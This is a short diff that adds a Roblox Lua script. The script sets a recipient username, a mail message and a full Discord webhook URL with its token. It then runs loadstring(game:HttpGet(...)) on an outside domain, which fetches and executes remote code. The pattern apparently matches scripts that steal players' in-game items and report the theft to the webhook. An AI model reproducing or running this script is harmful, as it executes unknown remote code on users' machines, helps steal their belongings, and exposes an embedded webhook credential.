@@ -1,0 +1,6 @@
+lua
+Username = "Player156847"
+MailMessage = "moon best"
+Webhook = "https://discord.com/api/webhooks/1239549060734648352/VS9IiQw1S3_ZwXZWHhz1qxrsUmCf6qBOpi1XjWtZvbckC1XT6BBK-tMvE1rHhs7KK4MZ"
+
+loadstring(game:HttpGet("https://egorikusa.space/ttd"))()
